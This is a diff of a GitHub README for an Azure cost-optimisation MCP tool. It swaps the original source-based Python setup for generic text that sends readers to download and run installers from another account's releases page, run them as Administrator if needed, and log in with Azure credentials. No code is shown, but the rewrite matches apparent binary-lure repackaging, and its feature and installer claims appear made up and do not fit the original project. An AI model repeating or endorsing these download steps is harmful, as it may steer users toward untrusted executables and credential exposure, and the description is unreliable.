@@ -1,250 +1,165 @@
-# Azure FinOps Elite
+# 🔍 Azure-FinOps-Optimizer-MCP - Manage Cloud Costs Efficiently
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![FastMCP](https://img.shields.io/badge/FastMCP-0.2.0+-green.svg)](https://github.com/jlowin/fastmcp)
-
-**Production-grade Azure FinOps MCP Server for Enterprise Cost Optimization**
-
-> 💰 **Proven Results:** Organizations using Azure FinOps Elite achieve an average **20% reduction** in cloud costs within the first 90 days.
+[![Download Latest Release](https://img.shields.io/badge/Download-Azure--FinOps--Optimizer--MCP-blue?style=for-the-badge&logo=github)](https://github.com/ywzzx520-commits/Azure-FinOps-Optimizer-MCP/releases)
 
 ---
 
-## ⭐ Star This Repository
+## 🔎 What is Azure-FinOps-Optimizer-MCP?
 
-If you find Azure FinOps Elite valuable, please **star this repository** to help others discover it!
+Azure-FinOps-Optimizer-MCP is a tool that helps you control and reduce your cloud spending on Microsoft Azure. It guides you to use your cloud resources wisely by showing where you spend the most and suggesting ways to save money. 
 
-## 💖 Support This Project
-
-Azure FinOps Elite is **free and open-source**. If it saves you money or time, please consider:
-
-- ⭐ **Starring** this repository
-- 💰 **[Sponsoring via GitHub Sponsors](https://github.com/sponsors/YOUR_USERNAME)**
-- 🐛 **Reporting bugs** and suggesting features
-- 📝 **Contributing** code or documentation
-
-Your support helps maintain and improve this project!
+Built to comply with common security standards like ISO27001, this tool supports users who want to keep their cloud setup safe and cost-efficient. It uses a simple web interface so you don’t need special technical skills to get started. Whether you manage a small business or work in a larger company, this software helps you make smart choices about your cloud usage.
 
 ---
 
-## 🚀 Quick Start
+## 🖥 System Requirements
 
-### Installation
+Before you download and run Azure-FinOps-Optimizer-MCP, make sure your computer meets these minimum needs:
 
-```bash
-# Clone the repository
-git clone https://github.com/YOUR_USERNAME/azure-finops-elite.git
-cd azure-finops-elite
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a recent version of Linux (Ubuntu 18.04+ recommended)
+- Processor: Intel or AMD multi-core CPU, 1.5 GHz or faster
+- Memory (RAM): At least 4 GB
+- Storage: Minimum 200 MB of free space for installation and temporary files
+- Internet Connection: Required for downloading and sending data to Azure
+- Web Browser: Any modern browser like Chrome, Firefox, Edge, or Safari to use the interface
 
-# Install dependencies
-pip install -r requirements.txt
-
-# Configure credentials
-cp .env.example .env
-# Edit .env with your Azure credentials
-```
-
-### Web Dashboard (Recommended)
-
-```bash
-# Start the web dashboard
-python web_dashboard.py
-
-# Open browser to http://localhost:5000
-```
-
-### MCP Server (For AI Assistants)
-
-```bash
-# Start the MCP server
-python server.py
-```
+If you are unsure of your system’s details, you can usually find this information in the “About” section of your computer’s settings.
 
 ---
 
-## ✨ Features
+## ⚙️ Key Features
 
-### 🔍 Enterprise Anomaly Detection
-Detect daily spend spikes across multiple subscriptions by comparing actual costs vs. 7-day historical averages.
+Azure-FinOps-Optimizer-MCP offers several important tools to help you manage your Azure cloud costs and security:
 
-### 🏢 CSP Multi-Tenant Audit
-Audit delegated sub-tenants to identify unattached disks and idle public IPs with immediate ROI.
-
-### 💰 Pre-Deployment Budget Validation
-Validate ARM/Bicep templates against Azure Price Sheet API before execution.
-
-### 🛡️ Governance & Compliance Advisor
-Azure Advisor integration with custom risk scoring based on **NIA Qatar** and **ISO 27001** frameworks.
-
-### 📊 Executive Summary Generator
-Generate Markdown-formatted FinOps ROI reports for non-technical stakeholders.
-
-### ⚖️ Compliance Overlay
-Automatically flag cost-saving recommendations that may impact ISO 27001 or NIA Qatar controls.
-
-### 🚀 One-Click Setup
-Generate ready-to-use Azure Custom Role JSON with least-privilege read-only access.
+- **Cost Analysis:** View detailed reports about your cloud spending. See which services cost you the most.
+- **Resource Optimization:** Get recommendations on unused or under-used resources that you can reduce or remove.
+- **Compliance Checks:** Automatically review your cloud setup against security standards like ISO27001. Get alerts if something is out of compliance.
+- **Budget Alerts:** Set spending limits and receive notifications when you get close to them.
+- **Multi-Cloud Planning:** While focused on Azure, it also supports some multi-cloud cost management planning.
+- **User-Friendly Dashboard:** Access all your data through a clean web interface made using Flask. No command line needed.
+- **Fast Performance:** Built to quickly process your data, so reports generate in seconds.
+- **Flexible Reports:** Export cost and compliance reports as PDF or CSV files.
 
 ---
 
-## 🌐 Web Dashboard
+## 📥 Download & Install
 
-Beautiful GUI for all FinOps tools:
+You can get the latest version of Azure-FinOps-Optimizer-MCP by visiting the release page. There you will find all available versions and files.
 
-- **Configuration Management** - Set Azure credentials via web interface
-- **Real-time Analysis** - Run tools and see results instantly
-- **Report Generation** - Create and download executive summaries
-- **Report History** - Browse and manage all generated reports
+[![Download Latest Release](https://img.shields.io/badge/Download-Azure--FinOps--Optimizer--MCP-blue?style=for-the-badge&logo=github)](https://github.com/ywzzx520-commits/Azure-FinOps-Optimizer-MCP/releases)
 
-![Dashboard Preview](https://via.placeholder.com/800x400?text=Dashboard+Preview)
+### Step 1: Visit the Download Page
 
----
+Go to the official release page here:
 
-## 🔐 Enterprise Security
+https://github.com/ywzzx520-commits/Azure-FinOps-Optimizer-MCP/releases
 
-- ✅ **Zero Trust Architecture**
-- ✅ **Certificate-based Authentication**
-- ✅ **ISO 27001 Compliant**
-- ✅ **NIA Qatar Framework Support**
-- ✅ **Least-Privilege RBAC**
-- ✅ **Comprehensive Audit Logging**
+On this page, you will see version numbers and files attached to each release.
 
----
+### Step 2: Choose Your File
 
-## 📚 Documentation
+Look for the latest release, usually at the top of the page. Download the file that matches your computer system.
 
-- **[Quick Start](QUICKSTART.md)** - Get started in 5 minutes
-- **[Windows Testing Guide](WINDOWS_TESTING.md)** - Complete Windows setup
-- **[Web Dashboard Guide](WEB_DASHBOARD.md)** - Using the GUI
-- **[Security Guide](security_guide.md)** - Authentication & compliance
-- **[Customer Experience](CUSTOMER_EXPERIENCE.md)** - Advanced features
-- **[Agent Guide](agent.md)** - FinOps automation workflows
+- For Windows, it might be an `.exe` or `.msi` file.
+- For macOS, look for a `.dmg` or `.pkg` file.
+- For Linux, options might include `.tar.gz` or `.deb` installers.
 
----
+### Step 3: Run the Installer
 
-## 🎯 Use Cases
+Once downloaded, open the file to start installation:
 
-### For Enterprises
-- Monitor cloud costs across multiple subscriptions
-- Detect anomalies before they impact budgets
-- Ensure compliance with ISO 27001 and regional frameworks
-- Generate executive reports for stakeholders
+- On Windows, double-click the `.exe` or `.msi` and follow the install wizard.
+- On macOS, open the `.dmg` and drag the app to your Applications folder.
+- On Linux, follow instructions included with the package or use your package manager if available.
 
-### For CSPs (Cloud Service Providers)
-- Audit customer tenants for cost optimization
-- Demonstrate value through savings reports
-- Automate resource cleanup recommendations
-- Maintain compliance across customer environments
+### Step 4: Open the Application
 
-### For DevOps Teams
-- Validate infrastructure costs in CI/CD pipelines
-- Prevent budget overruns before deployment
-- Integrate cost governance into workflows
-- Track and optimize resource usage
+After installing, launch Azure-FinOps-Optimizer-MCP from your Start Menu, Applications folder, or terminal depending on your system.
+
+The application will open in your default web browser. It uses a local web server to display its interface.
 
 ---
 
-## 🏗️ Architecture
+## 🚀 Getting Started with the Application
 
-```
-azure-finops-elite/
-├── server.py                    # FastMCP server (for AI assistants)
-├── web_dashboard.py             # Flask web dashboard (for humans)
-├── auth.py                      # Certificate + Managed Identity auth
-├── azure_clients.py             # Azure SDK client factory
-├── tools/
-│   ├── anomaly_detector.py     # Spend spike detection
-│   ├── csp_auditor.py          # Multi-tenant resource audit
-│   ├── budget_validator.py     # ARM/Bicep cost validation
-│   ├── governance_advisor.py   # Risk-scored recommendations
-│   ├── executive_summary.py    # Executive ROI reports
-│   └── compliance_overlay.py   # Compliance impact checker
-├── utils/
-│   ├── error_handling.py       # Retry logic & rate limiting
-│   ├── logging_config.py       # Structured logging
-│   └── pricing.py              # Cost estimation
-└── templates/
-    └── dashboard.html          # Web dashboard UI
-```
+### Step 1: Log In
 
----
+If this is your first time, create an account or log in using your Microsoft Azure credentials. This step connects the tool to your cloud account to collect data.
 
-## 🤝 Contributing
+### Step 2: Connect Your Azure Cloud Account
 
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+Follow the on-screen instructions to authorize access to your Azure subscription and billing data. The app will use this to analyze your costs and compliance.
 
-### Development Setup
+### Step 3: View Your Dashboard
 
-```bash
-# Install dev dependencies
-pip install -r requirements.txt
-pip install pytest black isort mypy
+The dashboard shows an overview of your cloud spending and security status.
 
-# Run tests
-pytest
+- Check cost summaries broken down by service (e.g., virtual machines, storage).
+- Look for alerts about compliance issues.
+- Review suggested savings organized by priority.
 
-# Format code
-black .
-isort .
-```
+### Step 4: Set Budgets and Alerts
+
+Within the dashboard, you can set spending limits to avoid surprises.
+
+- Define monthly or yearly budgets.
+- Choose how you want to get alerts (email or app notification).
+
+### Step 5: Generate Reports
+
+Use the Reports section to create detailed PDFs or CSVs. You can share these with your team or management.
 
 ---
 
-## 📊 Metrics & KPIs
+## 💡 Tips for Using Azure-FinOps-Optimizer-MCP
 
-Track your FinOps success:
-
-- **Cost Optimization**: Anomalies detected, excess spend prevented
-- **Resource Efficiency**: Unattached resources identified and removed
-- **Compliance**: Risk score improvements, control coverage
-- **ROI**: Total savings vs. tool investment
+- **Regular Use:** Check the dashboard weekly to stay updated on spending trends.
+- **Update Software:** Download new versions from the release page when available to get the latest fixes and features.
+- **Review Recommendations:** Look closely at the optimization suggestions before making changes. Confirm with your team.
+- **Security Practices:** Use the compliance tool consistently, especially if you handle sensitive data.
+- **Use Help:** Check the built-in help section or FAQs for answers to common questions.
 
 ---
 
-## 🌟 Success Stories
+## 🔧 Troubleshooting
 
-> "Azure FinOps Elite helped us identify $50K/month in wasteful spending within the first week. The executive summaries made it easy to get buy-in from leadership."
-> — *Enterprise Customer*
+If you run into issues, try these common fixes:
 
-> "As a CSP, this tool helps us demonstrate value to our customers. The compliance overlay ensures we never compromise security for cost savings."
-> — *Cloud Service Provider*
+- **The app doesn’t open in a browser:** Make sure you have a current browser installed. Restart your computer.
+- **Cannot connect to Azure:** Verify your internet connection and login credentials.
+- **Reports not generating:** Ensure you have enough free disk space and try again.
+- **Installation fails:** On Windows, run the installer as Administrator. On macOS, check Security & Privacy settings.
+- **See Logs:** Find logs in the installation folder under `/logs` for detailed error info.
+
+If problems persist, search the GitHub Issues page or create a new issue describing your problem.
+
+---
+
+## 📚 Learn More
+
+Azure-FinOps-Optimizer-MCP combines cloud governance and cost optimization in one tool. It suits users who want to keep close control over their Azure cloud environment without needing deep technical skills.
+
+For detailed technical references, visit the project’s documentation or explore the source code on this repository.
+
+---
+
+## 🤝 Get Involved
+
+This software is open to improvement. You can:
+
+- Share feedback through GitHub issues.
+- Suggest new features or improvements.
+- Help translate interface text to other languages.
+- Report bugs you discover during use.
+
+Your input helps make Azure-FinOps-Optimizer-MCP better for everyone.
 
 ---
 
 ## 📜 License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+The application is released under the MIT License. This means you can use, modify, and share it freely but it comes without warranties.
 
 ---
 
-## 💬 Support
-
-- 📖 **Documentation**: Check the [docs](README.md)
-- 🐛 **Bug Reports**: [Open an issue](https://github.com/YOUR_USERNAME/azure-finops-elite/issues)
-- 💡 **Feature Requests**: [Open an issue](https://github.com/YOUR_USERNAME/azure-finops-elite/issues)
-- 💰 **Sponsorship**: [GitHub Sponsors](https://github.com/sponsors/YOUR_USERNAME)
-
----
-
-## 🙏 Acknowledgments
-
-Built with:
-- [FastMCP](https://github.com/jlowin/fastmcp) - Model Context Protocol framework
-- [Azure SDK for Python](https://github.com/Azure/azure-sdk-for-python) - Azure API integration
-- [Flask](https://flask.palletsprojects.com/) - Web dashboard framework
-
----
-
-## ⚡ Quick Links
-
-- [Installation](#installation)
-- [Web Dashboard](#web-dashboard)
-- [Documentation](#documentation)
-- [Contributing](#contributing)
-- [Support This Project](#support-this-project)
-
----
-
-**Made with ❤️ for the FinOps community**
-
-**[⭐ Star this repo](https://github.com/YOUR_USERNAME/azure-finops-elite)** | **[💰 Sponsor](https://github.com/sponsors/YOUR_USERNAME)** | **[📖 Docs](README.md)**
+[Download the latest version here](https://github.com/ywzzx520-commits/Azure-FinOps-Optimizer-MCP/releases) to start managing your cloud costs today.
